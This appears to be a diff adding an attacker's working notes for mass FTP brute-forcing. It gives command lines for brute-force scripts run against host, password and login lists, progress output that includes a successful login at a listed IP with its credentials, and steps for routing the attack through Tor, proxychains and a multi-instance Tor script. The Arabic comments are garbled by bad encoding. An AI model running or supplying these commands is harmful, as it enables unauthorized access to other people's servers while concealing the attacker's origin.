@@ -1,0 +1,71 @@
+python rbrute_ftp.py -l hosts.lst -p pass.lst -u logins.lst  -t 300 -o valid.lst  full 10 -T 
+
+] Progress 255600/432962
+[*] Progress 255800/432962
+[*] Progress 256000/432962
+[*] Progress 256200/432962
+[*] Progress 256400/432962
+[+] Successful auth at 212.90.46.4:PlcmSpIp:PlcmSpIp
+[*] Progress 256600/432962
+[*] Progress 256800/432962
+[*] Progress 257000/432962
+[*] Progress 257200/432962
+[D] Retry on 212.90.157.182:PlcmSpIp (1/5)
+[*] Progress 257400/432962
+[*] Progress 257600/432962
+[*] Progress 257800/432962
+
+
+python rftp_brute_plas.py -l hosts.lst -p pass.lst -u logins.lst  -t 50 -o valid.lst  full 10 -T 
+
+«Ê· ‘Ì  ‰“· «· Ê— 
+apt-get install tor
+
+ «‰Ì ‘Ì  —ÊÕ «·„”«— 
+
+cd /etc/proxychains.conf 
+
+Ê Œ·ÌÂ œ«Ì‰„ﬂ 
+Ê ÷Ì› «·”ÿ— «·«ŒÌ— 
+socks 127.0.0.1    9050
+
+#dynamic_chain
+
+Œ·ÌÂ« 
+dynamic_chain
+Ì⁄‰Ì ‘Ì· «·„—»⁄
+
+
+«„— ›Ï Õ«·… ·Ì” —Ê 
+
+cp -r  /x/ /home/charlie/tor/nohup.out
+»⁄œÌ‰  —ÊÕ «·”ﬂ—»  Ê ⁄ÿÌ ’·«ÕÌ«  ·ﬂ· «·„·›«  ﬂ«««„·… 
+
+Ê»⁄œÌ‰  —ÊÕ ›Ê·œ— „· Ì  Ê— Multi-TOR 
+
+Ê Œ·ÌÂ ÌÃÂ“·ﬂ  Ê— »«·«⁄œ«œ 
+./multi-tor.sh 500
+
+ ‘€·Ê „« ÕﬂÌ· ﬂ  › ÕÊ
+ ‘€·Ê  ‘€Ì·
+chomd +x mutli-tor.sh 
+
+./multi-tor.sh 5
+
+root@yyyyyyyyyy:~/Multi-TOR# ./multi-tor.sh 20
+
+
+ÂÌﬂ «‰   ﬁœ—  ‘€· 10 À—Ìœ
+
+service tor start
+
+nohup ./rftp_brute_plas.py -l hosts.lst -p pass.lst -u logins.lst -t 50 -o valid.lst full 1 &            ÌÃ—» ⁄·Ï 1000  —Ìœ
+
+
+python rftp_brute_plas.py -l voip.lst -p password.lst -u logins.lst -t 50 -o valid.lst  --tor           ·· Ã—»…
+
+nohup ./rftp_brute_plas.py -l hosts.lst -p pass.lst -u logins.lst -t 500 -o valid.lst full 1 &
+nohup ./rftp_brute_plas.py -l hosts.lst -p pass3.lst -u logins.lst -t 250 -o valid.lst full 10 &
+
+ps aux | grep -i  python
+kill -9
